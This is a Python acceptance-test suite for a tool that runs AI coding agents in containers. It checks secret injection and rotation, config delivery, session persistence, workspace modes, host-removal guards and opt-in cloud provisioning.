            _exec("sh", "-c", "test -d /tmp/agent-container-apikeys.$(id -u)/codex-home").returncode
            == 0
        ), "CODEX_HOME not redirected to an ephemeral dir"
        assert (
            _exec("sh", "-c", "test -d /tmp/agent-container-apikeys.$(id -u)/pi-home").returncode
            == 0
        ), "PI_CODING_AGENT_DIR not redirected to an ephemeral dir"

        # SC-003: the key value is not literal in the generated compose file either.
        compose = (state / "agent-container" / "local" / f"{name}.compose.yaml").read_text()
        assert ant_val not in compose and oai_val not in compose
    finally:
        cli("wipe", name, "-y", timeout=120)


def test_injected_key_preserves_canonical_codex_config(acc, _image):
    """US2+US3 interaction regression (FR-007/SC-005): when a provider key is
    injected, Codex's home is redirected to an ephemeral dir — but the operator's
    canonical config (delivered fresh to ~/.codex) MUST be seeded into that
    redirected home, or the canonical config would be silently inert. Proves the
    ephemeral home carries config.toml while auth stays off the -codex volume."""
    name = "acccodexcfg"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    (_userconf(acc) / f"{name}.openai.key").write_text("sk-oai-SECRET\n")
    cfg = _pcd(work) / f"{name}.config" / "codex"
    cfg.mkdir(parents=True)
    marker = "model = 'CANONICAL-MARKER'"
    (cfg / "config.toml").write_text(marker + "\n")

    def cli(*args, timeout=600):
        return subprocess.run(
            [*AGENT_CONTAINER, *args], env=_cli_env(state), cwd=str(work),
            capture_output=True, text=True, stdin=subprocess.DEVNULL, timeout=timeout,
        )  # fmt: skip

    def _exec(*cmd):
        return subprocess.run(
            [RUNTIME, "exec", f"agent-container-{name}", *cmd], capture_output=True, text=True
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        _wait_sshd(int((state / "agent-container" / "local" / f"{name}.port").read_text().strip()))
        # canonical config delivered to the volume home (FR-007) ...
        vol = _exec("cat", "/home/dev/.codex/config.toml")
        assert vol.returncode == 0 and marker in vol.stdout, vol.stdout
        # ... AND seeded into the redirected ephemeral CODEX_HOME so codex actually reads it
        eph = _exec(
            "sh", "-c", 'cat "/tmp/agent-container-apikeys.$(id -u)/codex-home/config.toml"'
        )
        assert eph.returncode == 0 and marker in eph.stdout, (
            f"canonical config not seeded: {eph.stdout}{eph.stderr}"
        )
    finally:
        cli("wipe", name, "-y", timeout=120)


def test_canonical_config_fresh_redeploy_runtime_state_persists(acc, _image):
    """US3 (FR-007/FR-008 / SC-005) against a REAL container: operator-canonical
    config is delivered FRESH each deploy — a local edit propagates on `redeploy` —
    while the agent's mutable runtime state under the same home SURVIVES the
    container recreation from the per-agent volume (neither clobbers the other)."""
    name = "acccfg"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    # Project-local convention dir (discovered relative to the CLI's cwd): a
    # canonical file (in the manifest) plus a name that is NOT a manifest path.
    cfg = _pcd(work) / f"{name}.config" / "claude"
    cfg.mkdir(parents=True)
    (cfg / "CLAUDE.md").write_text("VERSION-ONE\n")

    def cli(*args, timeout=600):
        return subprocess.run(
            [*AGENT_CONTAINER, *args],
            env=_cli_env(state),
            cwd=str(work),  # so the project-local canonical config dir is discovered
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=timeout,
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        port = int((state / "agent-container" / "local" / f"{name}.port").read_text().strip())
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # FR-007: canonical config was delivered onto the ~/.claude volume.
        c = _exec(name, ["cat", "/home/dev/.claude/CLAUDE.md"])
        assert c.returncode == 0 and "VERSION-ONE" in c.stdout, c.stdout

        # The agent writes RUNTIME STATE under the same home (not a manifest path).
        w = _exec(
            name,
            ["sh", "-c", "printf 'RUNTIME-STATE\\n' > /home/dev/.claude/history.jsonl"],
        )
        assert w.returncode == 0, w.stderr

        # Operator edits the canonical file locally, then redeploys.
        (cfg / "CLAUDE.md").write_text("VERSION-TWO\n")
        r = cli("redeploy", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # FR-007/SC-005: the edit propagated (canonical delivered fresh each deploy).
        c = _exec(name, ["cat", "/home/dev/.claude/CLAUDE.md"])
        assert c.returncode == 0 and "VERSION-TWO" in c.stdout, c.stdout
        # FR-008/SC-005: the runtime state survived the recreate (from the volume).
        h = _exec(name, ["cat", "/home/dev/.claude/history.jsonl"])
        assert h.returncode == 0 and "RUNTIME-STATE" in h.stdout, h.stdout
    finally:
        cli("wipe", name, "-y", timeout=120)


def test_secret_rotation_new_value_in_effect_old_gone(acc, _image):
    """US4 (FR-015 / SC-006) against a REAL container: rotating a tool-injected
    secret is only a LOCAL edit + `redeploy` — the new value is in effect at the
    ephemeral inject path afterward, and NO baked or persisted copy of the OLD
    value survives on the host (not on a per-agent volume, not in the compose file,
    and the host-side staged copy is overwritten with the new value).

    Scope note (opt-in/tokened, NOT run here): confirming a narrowly-scoped
    per-repo deploy key grants ONLY the intended repository access (FR-004) needs a
    real remote git host — that is the opt-in tokened extension, outside the CI cost
    boundary. Since Feature 019 the deploy key IS the container's own generated key
    (`ssh-key show`), so there is no injected-key plumbing left for a unit tier to
    prove; what remains to check is on the forge, not in this tool."""
    name = "accrot"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    old_val = "sk-ant-ROTATE-OLD-SECRET"
    new_val = "sk-ant-ROTATE-NEW-SECRET"
    key_file = _userconf(acc) / f"{name}.anthropic.key"
    key_file.write_text(old_val + "\n")
    inject_path = "/run/agent-container/apikeys/anthropic"
    compose_path = state / "agent-container" / "local" / f"{name}.compose.yaml"
    staged_path = state / "agent-container" / "local" / f"{name}.apikey.anthropic"

    def cli(*args, timeout=600):
        return subprocess.run(
            [*AGENT_CONTAINER, *args],
            env=_cli_env(state),
            cwd=str(work),  # so the project-local key file is discovered
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=timeout,
        )

    def _exec(*cmd):
        return subprocess.run(
            [RUNTIME, "exec", f"agent-container-{name}", *cmd], capture_output=True, text=True
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        port = int((state / "agent-container" / "local" / f"{name}.port").read_text().strip())
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # Before rotation: the OLD value is what the ephemeral inject path serves.
        c = _exec("cat", inject_path)
        assert c.returncode == 0 and old_val in c.stdout, c.stdout

        # Operator rotates: edit the LOCAL file, then redeploy (no image/volume change).
        key_file.write_text(new_val + "\n")
        r = cli("redeploy", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # SC-006: the NEW value is in effect at the ephemeral inject path...
        c = _exec("cat", inject_path)
        assert c.returncode == 0 and new_val in c.stdout, c.stdout
        assert old_val not in c.stdout  # ...and the old value no longer served
        # ...no OLD (or new) value persisted onto any per-agent volume (FR-012)...
        for vol in ("/home/dev/.claude", "/home/dev/.codex", "/home/dev/.pi"):
            g = _exec("grep", "-rF", old_val, vol)
            assert g.returncode != 0, f"old secret survived rotation on {vol}:\n{g.stdout}"
            g = _exec("grep", "-rF", new_val, vol)
            assert g.returncode != 0, f"new secret leaked onto {vol}:\n{g.stdout}"
        # ...the compose file never inlines either value (referenced by path)...
        compose = compose_path.read_text()
        assert old_val not in compose and new_val not in compose
        # ...and the host-side staged copy was OVERWRITTEN with the new value (no
        # stale old copy left on the operator's machine either).
        staged = staged_path.read_text()
        assert new_val in staged and old_val not in staged
    finally:
        cli("wipe", name, "-y", timeout=120)


# --- Feature 004: execution modes, sessions, workspaces (real containers) ----
# The agent actually RESPONDING (SC-001, a real model call) is the opt-in/tokened
# extension and is NOT run here; these verify the mechanisms — the launch fires,
# sessions survive detach + report a dead session, headless propagates an exit
# code, and the three workspace modes behave per their durability — without a key.


def _logs_of(name: str) -> str:
    r = subprocess.run([RUNTIME, "logs", f"agent-container-{name}"], capture_output=True, text=True)
    return r.stdout + r.stderr


def test_interactive_launches_agent_in_a_window(acc):
    """US1/SC-001 (mechanism): interactive mode launches the chosen agent in a
    dedicated tmux window. The launch is observable in the entrypoint log even if
    the agent later exits for want of a model key (the response is the tokened bit)."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up(
        "acc4int", mode="interactive", agent="claude", authorized_key=[laptop.with_suffix(".pub")]
    )
    assert "launched agent 'claude'" in _logs_of("acc4int")


def test_detach_reattach_and_session_liveness(acc):
    """US2/SC-002/003 (FR-006/007/008): the session survives disconnect and a fresh
    connection reattaches to the same 'main'; once the session ends, the
    `tmux has-session` signal the attach probe reads flips to dead (the CLI's
    'nothing running' report off that signal is unit-covered — driving the real
    interactive attach here would hit host-key verification)."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acc4sess", authorized_key=[laptop.with_suffix(".pub")])
    # Two independent ssh connections = detach then reattach: 'main' persists.
    assert _ssh(port, laptop, "tmux has-session -t main && echo ALIVE").stdout.split() == ["ALIVE"]
    assert _ssh(port, laptop, "tmux has-session -t main && echo ALIVE").stdout.split() == ["ALIVE"]
    # End the session -> the probe's signal goes non-zero (dead), never a live 'main'.
    _ssh(port, laptop, "tmux kill-server")
    assert (
        _ssh(port, laptop, "tmux has-session -t main; echo rc=$?").stdout.strip().endswith("rc=1")
    )


def test_headless_foreground_propagates_exit_code(acc):
    """US3/SC-004 (mechanism, FR-002/004): a headless --foreground run returns
    control on completion and the CLI exit status IS the agent container's exit
    code. Without a model key the agent fails, so we assert a NON-ZERO code returns
    promptly (the success-not-resurrected side is the tokened extension)."""
    r = acc.up(
        "acc4hl", mode="headless", agent="claude", task="print ok", foreground=True, wait=False
    )
    assert r.returncode != 0  # the agent's failure surfaced as our exit code (SC-004)


def test_workspace_persistent_survives_recreate(acc):
    """US4/SC-006: a persistent workspace retains its working copy across down/up."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acc4pers", workspace="persistent", authorized_key=[laptop.with_suffix(".pub")])
    _ssh(port, laptop, "echo keep-me > /workspace/marker")
    acc.down("acc4pers")  # no --purge: the workspace volume is preserved
    port = acc.up("acc4pers", workspace="persistent", authorized_key=[laptop.with_suffix(".pub")])
    r = _ssh(port, laptop, "cat /workspace/marker")
    assert r.stdout.strip() == "keep-me"


def test_workspace_ephemeral_gone_after_teardown(acc):
    """US4/SC-006: an ephemeral workspace (container layer) does NOT survive."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acc4eph", workspace="ephemeral", authorized_key=[laptop.with_suffix(".pub")])
    _ssh(port, laptop, "echo transient > /workspace/marker")
    acc.down("acc4eph")
    port = acc.up("acc4eph", workspace="ephemeral", authorized_key=[laptop.with_suffix(".pub")])
    r = _ssh(port, laptop, "cat /workspace/marker 2>/dev/null; echo GONE")
    assert r.stdout.strip().splitlines()[-1] == "GONE"


def test_workspace_bind_reflects_local_dir(acc):
    """US4/SC-007: a bind workspace mounts the operator's LOCAL directory at
    /workspace — the container sees the host dir's contents. (The write-back
    direction depends on a writable Lima mount, a documented `--mount`
    prerequisite; the local-only refusal is unit-covered.)"""
    laptop = _gen_keypair(acc.tmp / "laptop")
    wsdir = acc.tmp / "bindwork"  # under the Lima-shared acc base
    wsdir.mkdir()
    (wsdir / "seed").write_text("host-side\n")  # a host file the bind must expose
    port = acc.up(
        "acc4bind",
        workspace="bind",
        workspace_dir=wsdir,
        authorized_key=[laptop.with_suffix(".pub")],
    )
    assert _ssh(port, laptop, "cat /workspace/seed").stdout.strip() == "host-side"


def test_clone_on_start_ssh_with_an_unregistered_key_is_PENDING(acc):
    """Feature 004's US4/SC-008 inverted by Feature 019, deliberately.

    004 refused BEFORE starting: with no injected push key an SSH clone could never
    work, so an empty-workspace agent was pure waste. 019 removes the injection — the
    container makes its own key — and a first boot therefore CANNOT have a registered
    one. Refusing now would leave the operator with no container to read the key out
    of, so the refusal became a pending state.

    What FR-014 still guarantees is unchanged and is what this asserts: the deploy
    does not silently hand back an empty workspace. It exits non-zero, names the key,
    and names the recovery.
    """
    r = acc.up(
        "acc4clone",
        workspace="ephemeral",
        repo="git@github.com:you/private-repo.git",
        wait=False,
    )
    assert r.returncode != 0
    assert "was NOT cloned" in r.stderr
    assert "ssh-key show acc4clone" in r.stderr
    assert "DO NOT tear this environment down" in r.stderr


# --- Feature 005: shell integration (real containers) ------------------------


def test_attach_print_matches_the_live_target(acc):
    """US1/SC-001: `attach --print` emits the runnable ssh+tmux command with the
    LIVE deployment's coordinates (byte-for-byte what execute runs — parity is
    unit-proven — so running it verbatim reaches the same session). We assert the
    coordinates match the live port without tripping the test host's key verification."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acc5print", authorized_key=[laptop.with_suffix(".pub")])
    state = acc.tmp / "state"
    r = _run_cli([*AGENT_CONTAINER, "attach", "acc5print", "--local", "--print"], state)
    assert r.returncode == 0, r.stderr
    out = r.stdout.strip()
    # The LIVE coordinates and the remote command, asserted around the middle rather
    # than as one byte string: Feature 018 inserted the verification options, whose
    # UserKnownHostsFile path is the test's own temp state dir and so cannot be
    # spelled out here. Byte-for-byte parity with the execute path is unit-proven.
    assert out.startswith(f"ssh dev@localhost -p {port} ")
    assert out.endswith("-t tmux attach -t main")
    assert "-o StrictHostKeyChecking=yes" in out
    assert f"-o UserKnownHostsFile={state}/agent-container/local/known_hosts" in out
    r2 = _run_cli([*AGENT_CONTAINER, "attach", "acc5print", "--local", "--ssh-config"], state)
    assert f"Port {port}" in r2.stdout and "RemoteCommand tmux attach -t main" in r2.stdout
    assert "StrictHostKeyChecking yes" in r2.stdout


@pytest.mark.skipif(
    RUNTIME != "docker", reason="host env DOCKER_CONTEXT eval test is docker-specific"
)
def test_host_env_eval_retargets_docker(acc):
    """US2/SC-002: `eval $(agent-container host env NAME)` sets DOCKER_CONTEXT so the
    operator's own docker lists that host's containers — with no tool wrapper."""
    acc.up("acc5env")
    state = acc.tmp / "state"
    ctx = subprocess.run(
        ["docker", "context", "show"], capture_output=True, text=True
    ).stdout.strip()
    cfg = _config_dir_of(state)
    cfg.mkdir(parents=True, exist_ok=True)
    cfg.joinpath("hosts.json").write_text(
        json.dumps(
            {
                "version": 1,
                "default": None,
                "hosts": {
                    "acc5envhost": {"driver": "docker", "context": ctx, "address": "localhost"}
                },
            }
        )
    )
    r = _run_cli([*AGENT_CONTAINER, "host", "env", "acc5envhost"], state)
    assert r.returncode == 0, r.stderr
    assert r.stdout.strip() == f"export DOCKER_CONTEXT={ctx}"
    # eval the EMITTED text in a real sh, then confirm docker targets that context.
    ps = subprocess.run(
        ["sh", "-c", 'eval "$1"; docker ps --format "{{.Names}}"', "_", r.stdout],
        env=_cli_env(state),
        capture_output=True,
        text=True,
    )
    assert "agent-container-acc5env" in ps.stdout


def test_host_rm_destroy_emptiness_guard_against_real_containers(acc, tmp_path):
    """US3 / SC-005 against REAL containers: `host rm --destroy` must refuse while
    ANY container is still present on the host, and release only once it is empty.
    Proves host_container_names actually reflects live daemon state (the unit tests
    stub it). No cloud call is ever made — we seed a tool-created hetzner-shaped host
    that points at the LOCAL daemon (context="", no `connection` so the ssh tunnel
    is a no-op), and pop HCLOUD_TOKEN so the emptiness-passed case fails at the token
    gate ('HCLOUD_TOKEN') rather than 'still present' — the deterministic tell that
    the guard released without deprovisioning anything."""

    driver = "podman" if "podman" in RUNTIME else "docker"
    config = tmp_path / "config" / "agent-container"
    config.mkdir(parents=True)
    reg = {
        "version": 1,
        "default": "acchz",
        "hosts": {
            "acchz": {
                "driver": driver,
                "context": "",  # the default local daemon — host_container_names sees acc's containers
                "address": "localhost",
                "provisioning": {"provider": "hetzner", "server_id": 999, "created": True},
                "created_by_tool": True,
            }
        },
    }
    (config / "hosts.json").write_text(json.dumps(reg))

    def host_rm_destroy():
        env = _cli_env(acc.tmp / "state")
        env["XDG_CONFIG_HOME"] = str(tmp_path / "config")
        env.pop("HCLOUD_TOKEN", None)  # never make a real cloud call from this test
        return subprocess.run(
            [*AGENT_CONTAINER, "host", "rm", "acchz", "--destroy", "-y"],
            env=env,
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=120,
        )

    acc.up("acchza")
    acc.up("acchzb")
    r = host_rm_destroy()
    assert r.returncode != 0 and "still present" in r.stderr, r.stderr  # refused: 2 present

    acc.down("acchza")
    r = host_rm_destroy()
    assert r.returncode != 0 and "still present" in r.stderr, r.stderr  # sibling still present

    acc.down("acchzb")
    r = host_rm_destroy()
    # Empty now: the guard released — it fails ONLY at the token gate, proving it got
    # past the emptiness check without touching (or destroying) a loaded server.
    assert r.returncode != 0, r.stdout
    assert "HCLOUD_TOKEN" in r.stderr and "still present" not in r.stderr, r.stderr


def test_host_rm_destroy_fails_closed_when_daemon_unreachable(tmp_path):
    """Fail-CLOSED at the real CLI (review #5): a tool-created host whose daemon
    cannot be reached (here a nonexistent docker context, so `ps` exits non-zero)
    must REFUSE --destroy — a failed enumeration is never read as 'empty', so an
    unreachable server is never destroyed. No containers, no cloud call (no token)."""
    driver = "podman" if "podman" in RUNTIME else "docker"
    config = tmp_path / "config" / "agent-container"
    config.mkdir(parents=True)
    reg = {
        "version": 1,
        "default": "deadhz",
        "hosts": {
            "deadhz": {
                "driver": driver,
                "context": "agent-container-nonexistent-xyz",  # no such context -> ps fails
                "address": "203.0.113.200",
                "provisioning": {"provider": "hetzner", "server_id": 777, "created": True},
                "created_by_tool": True,
            }
        },
    }
    (config / "hosts.json").write_text(json.dumps(reg))
    env = _cli_env(tmp_path / "state")
    env["XDG_CONFIG_HOME"] = str(tmp_path / "config")
    env.pop("HCLOUD_TOKEN", None)
    r = subprocess.run(
        [*AGENT_CONTAINER, "host", "rm", "deadhz", "--destroy", "-y"],
        env=env,
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=60,
    )
    assert r.returncode != 0, r.stdout
    assert "could not confirm" in r.stderr, r.stderr  # refused: enumeration failed, not "empty"


# --- Hetzner provisioning (US2) — OPT-IN, BILLABLE, never in CI ---------------
# Requires HCLOUD_TOKEN in the env; skips otherwise. Provisions a REAL server,
# verifies docker + compose came up (cloud-init), then destroys it in a finally
# so an assertion failure can never leave a billable orphan. Deletes ONLY the
# server it created (by the unique name / its own server_id) — never any other
# server in the project.

import importlib.util  # noqa: E402
from importlib.machinery import SourceFileLoader  # noqa: E402


def _load_cli():
    loader = SourceFileLoader("_ac_prov", str(SCRIPT_PATH))
    spec = importlib.util.spec_from_loader("_ac_prov", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


# Policy: CI/CD MUST NEVER provision real infrastructure or incur cost. This test
# is a developer-only, intentional, LOCAL action. The CI guard is belt-and-braces:
# it refuses to run under any CI runner even if a token is present in the env, so
# accidentally exposing HCLOUD_TOKEN to a workflow can't trigger a billable run.
_IN_CI = bool(os.environ.get("CI") or os.environ.get("GITHUB_ACTIONS"))


@pytest.mark.skipif(
    _IN_CI or not os.environ.get("HCLOUD_TOKEN"),
    reason="billable real provisioning — never runs in CI; opt-in locally via HCLOUD_TOKEN",
)
def test_hetzner_provision_deploy_destroy(tmp_path, monkeypatch):
    import json as _json

    name = "acc-hz"  # unique, RFC-1123; matches the created server + docker context name
    token = os.environ["HCLOUD_TOKEN"]

    state = tmp_path / "state"
    config = tmp_path / "config"
    state.mkdir()
    config.mkdir()
    # Point THIS process's cli at the same XDG dirs as the host-add subprocess, so
    # the in-process tunnel re-check below finds the automation key host-add wrote.
    monkeypatch.setenv("XDG_STATE_HOME", str(state))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(config))
    cli = _load_cli()
    env = dict(os.environ)

    # Overridable so a run can dodge a "resource_unavailable" placement (ARM/region
    # capacity varies). Default to a broadly-available x86 shared type.
    srv_type = os.environ.get("AGENT_CONTAINER_ACC_SERVER_TYPE", "cpx11")
    srv_loc = os.environ.get("AGENT_CONTAINER_ACC_LOCATION", "nbg1")
    add_argv = [
        *AGENT_CONTAINER,
        "host",
        "add",
        name,
        "--provider",
        "hetzner",
        "--create",
        "--server-type",
        srv_type,
        "--location",
        srv_loc,
    ]
    # Authorize a specific operator PUBLIC key when ~/.ssh/id_*.pub is absent
    # (e.g. a hardware/agent-backed key). AGENT_CONTAINER_SSH_PUBKEY = its path.
    pub = os.environ.get("AGENT_CONTAINER_SSH_PUBKEY")
    if pub:
        add_argv += ["--ssh-pubkey", pub]

    host: dict | None = None
    try:
        r = subprocess.run(add_argv, env=env, capture_output=True, text=True, timeout=900)
        # host add succeeding IS the end-to-end proof: the tool polled `docker
        # version` over the automation-key socket-forward until docker answered.
        assert r.returncode == 0, f"provision failed:\n{r.stderr}"
        reg = _json.loads((config / "agent-container" / "hosts.json").read_text())
        host = reg["hosts"][name]
        assert host["created_by_tool"] is True
        assert isinstance(host["provisioning"]["server_id"], int)
        assert host["provisioning"]["connection"] == "ssh-forward"
        assert isinstance(host["provisioning"]["automation_ssh_key_id"], int)
        assert host["context"] == "agent-container-acc-hz"
        # From a FRESH tunnel in THIS process (the provisioning tunnel is gone),
        # the compose v2 plugin answers over the forward — proving both the
        # socket-forward reconnects across invocations and compose is installed.
        cli.ensure_tunnel(host)
        ctx = host["context"]
        assert (
            subprocess.run(
                ["docker", "--context", ctx, "compose", "version"],
                capture_output=True,
                timeout=60,
            ).returncode
            == 0
        ), "compose plugin missing / socket-forward did not re-establish"
    finally:
        # ALWAYS destroy — primary path via the tool, then a hcloud fallback, so a
        # billable server is never left running even if the tool's teardown fails.
        if host is not None:
            try:
                cli.provisioner_destroy(host, token)
            except Exception as e:  # noqa: BLE001
                print(f"provisioner_destroy failed: {e}")
        if shutil.which("hcloud"):
            subprocess.run(["hcloud", "server", "delete", name], capture_output=True)


# --- Feature 006 declarative (agent-as-code) acceptance ----------------------
# Batches the deferred US1/US2 acceptance (T010/T013) with US3 (T016): a real
# `.agent-container/` project applies to a running container, the governing spec
# is read-only in-container (FR-020), a referenced credential is injected with no
# plaintext on disk (SC-004), and status→drift→converge→scoped-destroy holds.

_AAC_PROJECT = """\
environments:
  - name: {name}
    host: local
    container:
      mode: interactive
      agent: {agent}
      workspace: persistent
      env_file: ./ci.env
    credentials:
      - {{ name: MYSECRET, source: env, var: MYSECRET_SRC }}
"""


def _write_project(proj: Path, name: str, agent: str = "claude") -> None:
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        _AAC_PROJECT.format(name=name, agent=agent)
    )
    (proj / "ci.env").write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")


def test_declarative_apply_ro_spec_credential_drift_destroy(acc):
    name = "aacacc"
    secret = "sk-decl-acceptancevalue"  # env-file-clean (no space/quote/# to mangle)
    proj = acc.tmp / "aacproj"
    _write_project(proj, name, agent="claude")
    acc.register(name)  # ensure teardown even if an assertion fails mid-test
    env = {"MYSECRET_SRC": secret}

    # apply → the declared environment converges to a running container.
    r = acc.cli(["apply", "-y"], cwd=proj, extra_env=env)
    assert r.returncode == 0, f"apply failed:\n{r.stderr}"
    _wait_container_state(f"agent-container-{name}", "running")

    # T010 / FR-020: the governing spec is delivered READ-ONLY in-container — a
    # write must fail, and the in-container copy matches the host spec.
    w = _exec(name, ["sh", "-c", "echo pwned >> /workspace/.agent-container/environments.yaml"])
    assert w.returncode != 0, "FR-020 breach: the in-container spec was writable"
    shown = _exec(name, ["cat", "/workspace/.agent-container/environments.yaml"])
    assert shown.returncode == 0 and f"name: {name}" in shown.stdout

    # T013 / SC-004: the referenced credential reached the container as an env var,
    # and NO plaintext of the value appears anywhere in the tracked project dir.
    got = _exec(name, ["printenv", "MYSECRET"])
    assert got.returncode == 0 and got.stdout.strip() == secret
    on_disk = [p for p in proj.rglob("*") if p.is_file() and secret in p.read_text(errors="ignore")]
    assert on_disk == [], f"SC-004 breach: plaintext secret found in project dir: {on_disk}"

    # apply is idempotent — a matching spec makes no change (SC-002).
    r = acc.cli(["apply", "-y"], cwd=proj, extra_env=env)
    assert r.returncode == 0 and "no changes" in r.stderr

    # T016 / FR-008: change the declared config (agent) → status reports field-level
    # drift; apply converges (recreates) → status returns to matching.
    _write_project(proj, name, agent="codex")
    st = acc.cli(["status"], cwd=proj, extra_env=env)
    assert st.returncode == 0 and "drifted" in st.stderr and "agent" in st.stderr
    r = acc.cli(["apply", "-y"], cwd=proj, extra_env=env)
    assert r.returncode == 0, f"converge failed:\n{r.stderr}"
    _wait_container_state(f"agent-container-{name}", "running")
    assert _exec(name, ["printenv", "AGENT_CONTAINER_AGENT"]).stdout.strip() == "codex"
    st = acc.cli(["status"], cwd=proj, extra_env=env)
    assert "matching" in st.stderr and "drifted" not in st.stderr

    # T016 / SC-006/007: destroy removes ONLY the declared identity; an unrelated
    # imperative container is untouched. --deprovision on a REFERENCED host (local)
    # removes the container but NEVER the host (T019/FR-017, CI-safe — no cloud).
    acc.up("aacother")  # unrelated running container (registered for teardown by up)
    r = acc.cli(["destroy", "-y", "--deprovision"], cwd=proj, extra_env=env)
    assert r.returncode == 0, f"destroy --deprovision failed:\n{r.stderr}"
    _wait_container_state(f"agent-container-{name}", "")  # gone
    assert _container_state("agent-container-aacother") == "running"  # untouched
    # the referenced local host is unaffected — the daemon still serves containers
    assert RUNTIME and _container_state("agent-container-aacother") == "running"


# T019 (provisioned-host end-to-end) is REAL Hetzner — billable, MUST NOT run in CI.
# Opt in with HCLOUD_TOKEN + AGENT_CONTAINER_PROVISION_ACCEPTANCE=1 to exercise it.
@pytest.mark.skipif(
    not (os.environ.get("HCLOUD_TOKEN") and os.environ.get("AGENT_CONTAINER_PROVISION_ACCEPTANCE")),
    reason="real-Hetzner provisioning is billable/opt-in (set HCLOUD_TOKEN + "
    "AGENT_CONTAINER_PROVISION_ACCEPTANCE=1)",
)
def test_declarative_provisioned_host_hetzner(acc):
    name = "aacprov"
    hostname = "aac-prov-acc"  # RFC-1123 (no underscore)
    proj = acc.tmp / "provproj"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        f"environments:\n  - name: {name}\n"
        f"    host: {{ provision: hetzner, name: {hostname}, server_type: cx22, location: nbg1 }}\n"
        f"    container:\n      env_file: ./ci.env\n"
    )
    (proj / "ci.env").write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")
    acc.register(name)
    tok = {"HCLOUD_TOKEN": os.environ["HCLOUD_TOKEN"]}
    try:
        r = acc.cli(["apply", "-y"], cwd=proj, extra_env=tok, timeout=1200)
        assert r.returncode == 0, f"provisioned apply failed:\n{r.stderr}"
        assert f"provisioning host {hostname}" in r.stderr
        # the provisioned host is registered as tool-created
        show = acc.cli(["host", "show", hostname, "--json"], extra_env=tok)
        assert (
            '"created_by_tool": true' in show.stdout.replace(" ", "").replace("\n", "").lower()
            or '"created_by_tool":true' in show.stdout.lower()
        )
    finally:
        # destroy --deprovision removes the container AND the spec-created server.
        d = acc.cli(["destroy", "-y", "--deprovision"], cwd=proj, extra_env=tok, timeout=1200)
        assert d.returncode == 0, f"destroy --deprovision failed:\n{d.stderr}"
        gone = acc.cli(["host", "show", hostname, "--json"], extra_env=tok)
        assert gone.returncode != 0  # host removed from the registry after deprovision


# --- Feature 008: credential managers (real container) -----------------------
# The generic `command` resolver exercises the whole manager path end-to-end with a
# trivial resolver — no real manager CLI (and no account/secret) needed in CI.

# NOTE: the resolver argv is a pure LOCATOR — `printenv <VAR>` names where the secret
# lives, never the value itself (FR-013). Embedding the value here would put a secret in
# the tracked spec, which is precisely what this feature exists to prevent.
_CMD_CRED_PROJECT = """\
environments:
  - name: {name}
    host: local
    container:
      mode: interactive
      agent: claude
      workspace: persistent
      env_file: ./ci.env
    credentials:
      - {{ name: MYSECRET, source: command, argv: ["printenv", "RESOLVER_SRC_008"] }}
"""


def test_declarative_command_source_injects_without_plaintext(acc):
    """T007 / SC-001+SC-002: a credential fetched by a resolver reaches the container,
    no plaintext lands in the project, and a failing resolver aborts before any change."""
    name = "aac008"
    secret = "sk-from-resolver-008"
    proj = acc.tmp / "cred008"
    (proj / ".agent-container").mkdir(parents=True)
    spec_file = proj / ".agent-container" / "environments.yaml"
    spec_file.write_text(_CMD_CRED_PROJECT.format(name=name))
    (proj / "ci.env").write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")
    acc.register(name)
    # The secret lives ONLY in the operator's environment; the spec names the variable.
    env = {"RESOLVER_SRC_008": secret}

    r = acc.cli(["apply", "-y"], cwd=proj, extra_env=env)
    assert r.returncode == 0, f"apply failed:\n{r.stderr}"
    _wait_container_state(f"agent-container-{name}", "running")

    # the resolver's value reached the container (trailing newline stripped, FR-012)...
    got = _exec(name, ["printenv", "MYSECRET"])
    assert got.returncode == 0 and got.stdout.strip() == secret
    # ...and no plaintext anywhere in the tracked project or the tool's output (SC-001)
    on_disk = [p for p in proj.rglob("*") if p.is_file() and secret in p.read_text(errors="ignore")]
    assert on_disk == [], f"SC-001 breach: plaintext in project dir: {on_disk}"
